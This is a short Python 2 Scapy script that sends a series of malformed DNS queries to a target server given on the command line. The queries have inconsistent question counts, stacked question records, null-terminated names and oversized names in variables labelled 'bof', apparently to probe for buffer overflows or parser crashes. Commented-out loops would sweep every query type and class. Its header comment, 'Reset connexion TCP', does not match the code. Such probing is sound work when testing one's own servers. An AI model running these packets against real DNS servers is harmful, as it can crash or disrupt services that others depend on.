#!/usr/bin/python
# -*- coding: utf-8 -*-
#Reset connexion TCP
#contact : lionel.prat9@gmail.com
from scapy.all import *
import sys
if __name__ == '__main__':
    if len(sys.argv) < 2:
        print 'Syntaxe : /.py srv_DNS'
        exit(0)
    IPsrv = sys.argv[1]
#    for typei in range(65535):
#        qnamei=str(typei)+".google.fr"
#        send(IP(dst = IPsrv)/UDP(dport = 53)/DNS(qr=0,opcode=0,qdcount=1,arcount=0,qd=DNSQR(qname=qnamei,qtype=typei,qclass=1)))
#    for classi in range(65535):
#        qnamei=str(typei)+"w.google.fr"
#        send(IP(dst = IPsrv)/UDP(dport = 53)/DNS(qr=0,opcode=0,qdcount=1,arcount=0,qd=DNSQR(qname=qnamei,qtype=1,qclass=classi)))
    p=sr1(IP(dst = IPsrv)/UDP(dport = 53)/DNS(id=0,qr=0,opcode=0,qdcount=1,arcount=0,qd=DNSQR(qname="1.blabla.fr",qtype=1,qclass=1)),timeout=20)
    if p:
        p.show()
    p=sr1(IP(dst = IPsrv)/UDP(dport = 53)/DNS(qr=0,opcode=0,qdcount=65535,arcount=0,qd=DNSQR(qname="2.blabla.fr",qtype=1,qclass=1)),timeout=20)
    if p:
        p.show()
    p=sr1(IP(dst = IPsrv)/UDP(dport = 53)/DNS(qr=0,opcode=0,qdcount=1,arcount=0,qd=[DNSQR(qname="3.blabla.fr",qtype=1,qclass=1)/DNSQR(qname="1.bloblo.fr",qtype=1,qclass=1)]),timeout=20)
    if p:
        p.show()
    p=sr1(IP(dst = IPsrv)/UDP(dport = 53)/DNS(qr=0,opcode=0,qdcount=1,arcount=0,qd=[DNSQR(qname="4.blabla.fr",qtype=1,qclass=1)/DNSQR(qname="2.bloblo.fr",qtype=1,qclass=1)]),timeout=20)
    if p:
        p.show()
    p=sr1(IP(dst = IPsrv)/UDP(dport = 53)/DNS(qr=0,opcode=0,qdcount=1,arcount=0,qd=[DNSQR(qname="5.blabla.fr",qtype=1,qclass=1)/DNSQR(qname="3.bloblo.fr\x00",qtype=1,qclass=1)]),timeout=20)
    if p:
        p.show()
    p=sr1(IP(dst = IPsrv)/UDP(dport = 53)/DNS(qr=0,opcode=0,qdcount=2,arcount=0,qd=[DNSQR(qname="6.blabla.fr",qtype=1,qclass=1)/DNSQR(qname="4.bloblo.fr",qtype=1,qclass=1)]),timeout=20)
    if p:
        p.show()
    p=sr1(IP(dst = IPsrv)/UDP(dport = 53)/DNS(qr=0,opcode=0,qdcount=0,arcount=0,qd=DNSQR(qname="7.blabla.fr",qtype=1,qclass=1)),timeout=20)
    if p:
        p.show()
    p=sr1(IP(dst = IPsrv)/UDP(dport = 53)/DNS(qr=0,opcode=0,qdcount=1,arcount=0,),timeout=20)
    if p:
        p.show()
    p=sr1(IP(dst = IPsrv)/UDP(dport = 53)/DNS(qr=0,opcode=0,qdcount=1,arcount=0,qd=DNSQR(qname="8.blabla.fr\x00",qtype=1,qclass=1)),timeout=20)
    if p:
        p.show()
    bof="."*2048
    p=sr1(IP(dst = IPsrv)/UDP(dport = 53)/DNS(qr=0,opcode=0,qdcount=1,arcount=0,qd=DNSQR(qname=bof,qtype=1,qclass=1)),timeout=20)
    if p:
        p.show()
    bof=" ."*1024
    p=sr1(IP(dst = IPsrv)/UDP(dport = 53)/DNS(qr=0,opcode=0,qdcount=1,arcount=0,qd=DNSQR(qname=bof,qtype=1,qclass=1)),timeout=20)
    if p:
        p.show()
    bof="*."*1024
    p=sr1(IP(dst = IPsrv)/UDP(dport = 53)/DNS(qr=0,opcode=0,qdcount=1,arcount=0,qd=DNSQR(qname=bof,qtype=1,qclass=1)),timeout=20)
    if p:
        p.show()
    bof=".in-addr.arpa"*512
    p=sr1(IP(dst = IPsrv)/UDP(dport = 53)/DNS(qr=0,opcode=0,qdcount=1,arcount=0,qd=DNSQR(qname=bof,qtype=1,qclass=1)),timeout=20)
    if p:
        p.show()
#    for x in range(47):
#        sr1(IP(dst = IPsrv)/UDP(dport = 53)/DNS(qr=0,opcode=0,qdcount=1,arcount=0,qd=DNSQR(qname="www.test"+str(x)+".fr",qtype=1,qclass=1)),timeout=20)
#        print "Test %i" % (x)
#        if p:
#            p.show()
#    for typei in range(65535):
#        qnamei=typei+".google.fr"
#        sr1(IP(dst = IPsrv)/UDP(dport = 53)/DNS(qr=0,opcode=0,qdcount=1,arcount=0,qd=DNSQR(qname=qnamei,qtype=typei,qclass=1)))
#    for classi in range(65535):
#        qnamei=typei+"w.google.fr"
#        sr1(IP(dst = IPsrv)/UDP(dport = 53)/DNS(qr=0,opcode=0,qdcount=1,arcount=0,qd=DNSQR(qname=qnamei,qtype=1,qclass=classi)))
